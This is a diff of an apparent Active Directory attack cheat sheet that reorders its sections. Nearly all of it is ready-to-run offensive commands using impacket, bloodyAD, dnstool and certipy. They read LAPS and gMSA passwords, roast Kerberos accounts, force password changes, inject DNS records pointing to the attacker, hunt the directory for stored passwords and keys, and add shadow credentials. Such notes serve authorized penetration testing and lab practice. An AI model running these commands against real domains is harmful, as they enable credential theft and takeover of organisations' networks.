@@ -22,20 +22,9 @@ impacket-GetADComputers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass | awk '/--
 cat /Upload/bloodhound/*_users.json | jq -r '.. | .samaccountname? // empty' | tee usernames_$DC
 cat /Upload/bloodhound/*_computers.json | jq -r '.. | .samaccountname? // empty' | tee computers_$DC
 
-## Computers and SIDs
-bloodyAD --dc-ip $TARGET --host $DC -k get search --filter '(objectClass=computer)' --attr distinguishedName --attr objectSid | grep -vE "^\s*$" | cut -d' ' -f2- | python3 -c "from sys import stdin; from rich.table import Table; from rich.console import Console; l=stdin.read().splitlines(); t=Table(show_lines=False); t.add_column('DN'); t.add_column('SID'); [t.add_row(l[i],l[i+1]) for i in range(0,len(l),2)]; Console().print(t)"
-
-## Users and SIDs
-bloodyAD --dc-ip $TARGET --host $DC -k get search --filter '(objectClass=user)' --attr distinguishedName --attr objectSid | grep -vE "^\s*$" | cut -d' ' -f2- | python3 -c "from sys import stdin; from rich.table import Table; from rich.console import Console; l=stdin.read().splitlines(); t=Table(show_lines=False); t.add_column('DN'); t.add_column('SID'); [t.add_row(l[i],l[i+1]) for i in range(0,len(l),2)]; Console().print(t)"
-
-## Groups and SIDs
-bloodyAD --dc-ip $TARGET --host $DC -k get search --filter '(objectClass=group)' --attr 'distinguishedName' --attr 'objectSid' | grep -vE "^\s*$" | cut -d' ' -f2- | python3 -c "from sys import stdin; from rich.table import Table; from rich.console import Console; l=stdin.read().splitlines(); t=Table(show_lines=False); t.add_column('DN'); t.add_column('SID'); [t.add_row(l[i],l[i+1]) for i in range(0,len(l),2)]; Console().print(t)"
-
-## Users Belonging to Specific Group and SIDs
-bloodyAD --dc-ip $TARGET --host $DC -k get search --filter '(objectClass=user)' --attr distinguishedName --attr objectSid | grep -B1 -A1 'Server Admins' | grep -vE "^\s*$" | cut -d' ' -f2- | python3 -c "from sys import stdin; from rich.table import Table; from rich.console import Console; l=stdin.read().splitlines(); t=Table(show_lines=False); t.add_column('DN'); t.add_column('SID'); [t.add_row(l[i],l[i+1]) for i in range(0,len(l),2)]; Console().print(t)"
-
-## Account Login Count
-bloodyAD --dc-ip $TARGET --host $DC -k get search --filter '(&(objectClass=user)(logonCount>=1))' --attr sAMAccountName,logonCount | grep -v 'distinguishedName' | grep -vE "^\s*$" | cut -d' ' -f2- | python3 -c "import sys;from rich.table import Table;from rich.console import Console;l=sys.stdin.read().splitlines();t=Table(show_lines=False);t.add_column('sAMAccountName');t.add_column('logonCount');[t.add_row(l[i+1],l[i])for i in range(0,len(l),2)];Console().print(t)"
+## Writable
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get writable --detail
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object User | grep -Ei 'pass|pwd' | grep -vE 'bad|Last|Time' | cat
 
 ## Delegation
 impacket-findDelegation -dc-host $DC $DOM/ -k -no-pass
@@ -56,6 +45,27 @@ impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile co
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -no-preauth 'NPUserjjones' -usersfile usernames_$DC
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -no-preauth 'NPUserjjones' -usersfile computers_$DC
 
+## ReadLAPSPassword
+impacket-GetLAPSPassword -dc-ip $TARGET $DOM/'$USERNAME:$PASSWORD' | awk '$1 ~ /\$$/ {print $1 " --> Administrator:" $3}'
+
+## ReadGMSAPassword
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object 'SVC_ACC$' --attr msDS-ManagedPassword
+
+## Computers and SIDs
+bloodyAD --dc-ip $TARGET --host $DC -k get search --filter '(objectClass=computer)' --attr distinguishedName --attr objectSid | grep -vE "^\s*$" | cut -d' ' -f2- | python3 -c "from sys import stdin; from rich.table import Table; from rich.console import Console; l=stdin.read().splitlines(); t=Table(show_lines=False); t.add_column('DN'); t.add_column('SID'); [t.add_row(l[i],l[i+1]) for i in range(0,len(l),2)]; Console().print(t)"
+
+## Users and SIDs
+bloodyAD --dc-ip $TARGET --host $DC -k get search --filter '(objectClass=user)' --attr distinguishedName --attr objectSid | grep -vE "^\s*$" | cut -d' ' -f2- | python3 -c "from sys import stdin; from rich.table import Table; from rich.console import Console; l=stdin.read().splitlines(); t=Table(show_lines=False); t.add_column('DN'); t.add_column('SID'); [t.add_row(l[i],l[i+1]) for i in range(0,len(l),2)]; Console().print(t)"
+
+## Groups and SIDs
+bloodyAD --dc-ip $TARGET --host $DC -k get search --filter '(objectClass=group)' --attr 'distinguishedName' --attr 'objectSid' | grep -vE "^\s*$" | cut -d' ' -f2- | python3 -c "from sys import stdin; from rich.table import Table; from rich.console import Console; l=stdin.read().splitlines(); t=Table(show_lines=False); t.add_column('DN'); t.add_column('SID'); [t.add_row(l[i],l[i+1]) for i in range(0,len(l),2)]; Console().print(t)"
+
+## Users Belonging to Specific Group and SIDs
+bloodyAD --dc-ip $TARGET --host $DC -k get search --filter '(objectClass=user)' --attr distinguishedName --attr objectSid | grep -B1 -A1 'Server Admins' | grep -vE "^\s*$" | cut -d' ' -f2- | python3 -c "from sys import stdin; from rich.table import Table; from rich.console import Console; l=stdin.read().splitlines(); t=Table(show_lines=False); t.add_column('DN'); t.add_column('SID'); [t.add_row(l[i],l[i+1]) for i in range(0,len(l),2)]; Console().print(t)"
+
+## Account Login Count
+bloodyAD --dc-ip $TARGET --host $DC -k get search --filter '(&(objectClass=user)(logonCount>=1))' --attr sAMAccountName,logonCount | grep -v 'distinguishedName' | grep -vE "^\s*$" | cut -d' ' -f2- | python3 -c "import sys;from rich.table import Table;from rich.console import Console;l=sys.stdin.read().splitlines();t=Table(show_lines=False);t.add_column('sAMAccountName');t.add_column('logonCount');[t.add_row(l[i+1],l[i])for i in range(0,len(l),2)];Console().print(t)"
+
 ## Password Change
 impacket-changepasswd $DOM/'$USERNAME:$PASSWORD'@$TARGET -k -p kpasswd -newpass '123qweasdF!'
 
@@ -69,10 +79,6 @@ dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP 
 ## DNS: Injection
 dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'
 
-## Writable
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get writable --detail
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object User | grep -Ei 'pass|pwd' | grep -vE 'bad|Last|Time' | cat
-
 ## Search: Computers
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=user)(!(sAMAccountType=805306368)))" | grep -av 'nTSecurityDescriptor:' | tee out_computers-info
 
@@ -84,12 +90,6 @@ bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectCla
 
 ## Search: Passwords and Keys
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=*))" | grep -a -Ei 'pass|pwd|key'
-
-## ReadGMSAPassword
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object 'SVC_ACC$' --attr msDS-ManagedPassword
-
-## ReadLAPSPassword
-impacket-GetLAPSPassword -dc-ip $TARGET $DOM/'$USERNAME:$PASSWORD' | awk '$1 ~ /\$$/ {print $1 " --> Administrator:" $3}'
 
 ## AddKeyCredentialLink
 certipy shadow auto -dc-ip $TARGET -target $DC -k -account 'SVC_CABACKUP'
